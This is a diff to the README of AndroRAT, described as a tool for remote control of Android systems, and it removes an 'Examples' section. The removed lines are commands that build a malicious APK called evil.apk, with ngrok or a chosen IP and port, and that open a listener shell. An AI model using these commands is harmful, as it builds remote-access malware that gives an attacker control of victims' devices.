@@ -13,16 +13,6 @@ AndroRAT is a tool designed to give the control of the android system remotely a
 
 ## Screenshots
 
-## Examples
-
-* To build the apk using ngrok which will also set the listner:
-```python3 androRAT.py --build --ngrok -o evil.apk```
-
-* To build the apk using desired ip and port:
-```python3 androRAT.py --build -i 192.169.x.x -p 8000 -o evil.apk```
-
-* To get the interpreter:
-```python3 androRAT.py --shell -i 0.0.0.0 -p 8000```
 
 ## Interpreter Examples
 * Generating APK
